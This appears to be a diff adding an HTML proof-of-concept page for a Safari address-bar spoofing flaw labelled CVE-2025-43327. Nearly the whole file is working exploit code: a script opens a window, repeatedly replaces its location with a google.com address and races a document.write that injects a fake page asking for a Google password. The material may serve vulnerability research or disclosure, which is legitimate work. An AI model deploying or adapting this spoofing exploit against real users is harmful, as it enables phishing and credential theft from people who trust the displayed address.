@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CVE-2025-43327 PoC - Address Bar Spoofing</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; margin-top: 50px; }
+        button { padding: 15px 30px; font-size: 18px; cursor: pointer; background: #007bff; color: white; border: none; border-radius: 5px; }
+    </style>
+</head>
+<body>
+
+    <h1>Safari CVE-2025-43327 Reproducer</h1>
+    <p>Click the button below to simulate the Address Bar Spoofing vulnerability.</p>
+    
+    <button onclick="triggerSpoof()">Start PoC Test</button>
+
+    <script>
+        function triggerSpoof() {
+            // Target URL to be shown in the address bar
+            const targetURL = "https://www.google.com:8080"; 
+            
+            // Malicious content to be rendered
+            const fakeContent = `
+                <html>
+                    <body style="background-color: #f1f1f1; text-align: center; padding-top: 100px;">
+                        <h1 style="color: red;">SPOOFED CONTENT LOADED</h1>
+                        <p>Address bar shows <b>google.com</b>, but this is a malicious page.</p>
+                        <input type="text" placeholder="Enter Google Password">
+                        <button>Login</button>
+                    </body>
+                </html>
+            `;
+
+            // 1. Open a new blank window
+            var spoofWindow = window.open("", "test", "width=800,height=600");
+
+            // 2. Race condition: Update location and immediately write content
+            // The interval keeps pushing the target URL to the address bar
+            setInterval(function() {
+                try {
+                    spoofWindow.location.replace(targetURL);
+                } catch (e) {}
+            }, 0);
+
+            // 3. Overwrite the document content before the navigation completes
+            setTimeout(function() {
+                spoofWindow.document.write(fakeContent);
+                spoofWindow.document.close();
+            }, 5);
+        }
+    </script>
+
+</body>
+</html>
